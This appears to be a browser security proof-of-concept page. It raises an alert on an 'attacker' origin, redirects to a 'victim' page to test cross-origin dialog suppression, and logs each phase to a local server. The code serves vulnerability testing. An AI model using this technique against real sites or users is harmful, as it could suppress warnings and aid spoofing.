 <!doctype html>
  <meta charset="utf-8">
  <title>dialog suppression cross-origin</title>
  <button id="run" autofocus style="position:fixed;left:0;top:0;width:340px;height:90px">prime dialog suppression</button>
  <pre id="log"></pre>
  <script>
  const params = new URLSearchParams(location.search);
  const runId = params.get("run") || Date.now();
  const target = params.get("target") ||
    "https://victimjodyritonga-create.github.io/victim/test.html";
  function note(data) {
    data.href = location.href;
    data.origin = location.origin;
    log.textContent += JSON.stringify(data) + "\n";
    fetch("http://localhost:8777/log", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify(data)
    }).catch(() => {});
  }
  note({ test: "dialog-suppression", phase: "loaded", runId });
  run.onclick = () => {
    note({ test: "dialog-suppression", phase: "attacker-click", runId });
    alert("attacker origin dialog");
    note({ test: "dialog-suppression", phase: "attacker-alert-returned", runId });
    const sep = target.includes("?") ? "&" : "?";
    location.href = target + sep + "run=" + encodeURIComponent(runId);
  };
  </script>
